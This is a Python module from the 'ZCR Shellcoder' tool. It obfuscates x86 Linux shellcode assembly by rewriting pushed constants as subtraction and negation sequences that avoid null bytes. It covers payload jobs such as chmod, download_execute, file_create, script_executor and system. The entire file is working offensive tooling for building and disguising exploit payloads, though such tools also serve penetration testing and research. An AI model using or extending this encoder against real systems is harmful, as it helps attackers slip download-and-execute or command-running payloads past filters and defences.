#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
'''
def start(type,shellcode,job):
	if 'chmod(' in job:	
		t = True
		eax = str('0x0f909090')
		while t:
			eax_1 = type.rsplit('sub_')[1][2:]
			eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
			if '00' not in str(eax_1) and '00' not in str(eax_2):
				t = False
		eax = 'push   $0x0f'
		eax_xor = 'push $0x%s\npop %%eax\npush $0x%s\npop %%ebx\nsub %%eax,%%ebx\nshr $0x10,%%ebx\nshr $0x08,%%ebx\npush %%ebx\n'%(eax_1,eax_2)
		shellcode = shellcode.replace(eax,eax_xor)
		ecx = str(shellcode.rsplit('\n')[10])
		ecx_value = str(shellcode.rsplit('\n')[10].rsplit()[1][1:])
		t = True
		while t:
			ecx_1 = type.rsplit('sub_')[1][2:]
			ecx_2 = "%x" % (int(ecx_value, 16) + int(ecx_1, 16))
			if '00' not in str(ecx_1) and '00' not in str(ecx_2) and len(ecx_1) >= 7 and len(ecx_2) >= 7 and '-' not in ecx_2:
				t = False
		ecx_xor = 'push $0x%s\npop %%ebx\npush $0x%s\npop %%ecx\nsub %%ebx,%%ecx\npush %%ecx\n_z3r0d4y_\n'%(str(ecx_1),str(ecx_2))
		shellcode = shellcode.replace(ecx,ecx_xor)
		n = 0
		start = ''
		middle = ''
		end = ''
		sub = 0
		for l in shellcode.rsplit('\n'):
			n += 1
			if sub is 0:
				if '_z3r0d4y_' not in l:
					start += l + '\n'
				else:
					sub = 1
			if sub is 1:
				if '_z3r0d4y_' not in l:
					if '%esp,%ebx' not in l:
						middle += l + '\n'
					else:
						sub = 2
			if sub is 2:
				end += l + '\n'
		for l in middle.rsplit('\n'):
			t = True
			while t:
				if 'push $0x' in l:
					ebx = l.rsplit()[1][1:]
					ebx_1 = type.rsplit('sub_')[1][2:]
					ebx_2 = "%x" % (int(ebx[2:], 16) + int(ebx_1, 16))
					if '00' not in str(ebx_1) and '00' not in str(ebx_2) and '-' not in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
						ebx_2 = ebx_2.replace('-','')
						command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%edx\nsub %%ebx,%%edx\npush %%edx\n'%(str(ebx_1),str(ebx_2))
						middle = middle.replace(l,command)
						t = False
				else:
					t = False
		shellcode = start + middle + end
	if 'dir_create(' in job:
		value = str(type.rsplit('sub_')[1][2:])
		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
		
		for line in shellcode.rsplit('\n'):
			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
				data = line.rsplit('push')[1].rsplit('$0x')[1]
				ebx_1 = value
				ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
				A = 0
				if str('-') in str(ebx_2):
					ebx_2 = ebx_2.replace('-','')
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
					A = 1
				if A is 0:
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
				shellcode = shellcode.replace(line,command)

		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd','push   $0xb909090\npop    %eax\ncltd')
		eax = str('0xb909090')
		eax_1 = value
		eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
		A = 0	

		eax = 'push   $%s'%(str(eax))	
		if '-' in eax_2:
			A = 1
			eax_2 = eax_2.replace('-','')
			eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		if A is 0:
			eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_sub+'\ncltd\n')
	if 'download_execute(' in job:
		value = str(type.rsplit('sub_')[1][2:])
		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
		
		for line in shellcode.rsplit('\n'):
			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
				data = line.rsplit('push')[1].rsplit('$0x')[1]
				ebx_1 = value
				ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
				A = 0
				if str('-') in str(ebx_2):
					ebx_2 = ebx_2.replace('-','')
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
					A = 1
				if A is 0:
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
				shellcode = shellcode.replace(line,command)

		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd','push   $0xb909090\npop    %eax\ncltd')
		eax = str('0xb909090')
		eax_1 = value
		eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
		A = 0	

		eax = 'push   $%s'%(str(eax))	
		if '-' in eax_2:
			A = 1
			eax_2 = eax_2.replace('-','')
			eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		if A is 0:
			eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_sub+'\ncltd\n')
	if 'download(' in job:
		value = str(type.rsplit('sub_')[1][2:])
		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
		
		for line in shellcode.rsplit('\n'):
			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
				data = line.rsplit('push')[1].rsplit('$0x')[1]
				ebx_1 = value
				ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
				A = 0
				if str('-') in str(ebx_2):
					ebx_2 = ebx_2.replace('-','')
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
					A = 1
				if A is 0:
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
				shellcode = shellcode.replace(line,command)

		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd','push   $0xb909090\npop    %eax\ncltd')
		eax = str('0xb909090')
		eax_1 = value
		eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
		A = 0	

		eax = 'push   $%s'%(str(eax))	
		if '-' in eax_2:
			A = 1
			eax_2 = eax_2.replace('-','')
			eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		if A is 0:
			eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_sub+'\ncltd\n')
	if 'exec(' in job:
		shellcode = 'N' + shellcode
	if 'file_create(' in job:
		value = str(type.rsplit('sub_')[1][2:])
		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
		
		for line in shellcode.rsplit('\n'):
			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
				data = line.rsplit('push')[1].rsplit('$0x')[1]
				ebx_1 = value
				ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
				A = 0
				if str('-') in str(ebx_2):
					ebx_2 = ebx_2.replace('-','')
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
					A = 1
				if A is 0:
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
				shellcode = shellcode.replace(line,command)

		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd','push   $0xb909090\npop    %eax\ncltd')
		eax = str('0xb909090')
		eax_1 = value
		eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
		A = 0	

		eax = 'push   $%s'%(str(eax))	
		if '-' in eax_2:
			A = 1
			eax_2 = eax_2.replace('-','')
			eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		if A is 0:
			eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_sub+'\ncltd\n')
	if 'script_executor(' in job:
		value = str(type.rsplit('sub_')[1][2:])
		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
		
		for line in shellcode.rsplit('\n'):
			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
				data = line.rsplit('push')[1].rsplit('$0x')[1]
				ebx_1 = value
				ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
				A = 0
				if str('-') in str(ebx_2):
					ebx_2 = ebx_2.replace('-','')
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
					A = 1
				if A is 0:
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
				shellcode = shellcode.replace(line,command)

		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd','push   $0xb909090\npop    %eax\ncltd')
		eax = str('0xb909090')
		eax_1 = value
		eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
		A = 0	

		eax = 'push   $%s'%(str(eax))	
		if '-' in eax_2:
			A = 1
			eax_2 = eax_2.replace('-','')
			eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		if A is 0:
			eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_sub+'\ncltd\n')
	if 'system(' in job:
		value = str(type.rsplit('sub_')[1][2:])
		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
		
		for line in shellcode.rsplit('\n'):
			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
				data = line.rsplit('push')[1].rsplit('$0x')[1]
				ebx_1 = value
				ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
				A = 0
				if str('-') in str(ebx_2):
					ebx_2 = ebx_2.replace('-','')
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
					A = 1
				if A is 0:
					command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
				shellcode = shellcode.replace(line,command)

		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd','push   $0xb909090\npop    %eax\ncltd')
		eax = str('0xb909090')
		eax_1 = value
		eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
		A = 0	
		eax = 'push   $%s'%(str(eax))	
		if '-' in eax_2:
			A = 1
			eax_2 = eax_2.replace('-','')
			eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		if A is 0:
			eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_sub+'\ncltd\n')
	if 'write(' in job:
		shellcode = 'N' + shellcode
	return shellcode
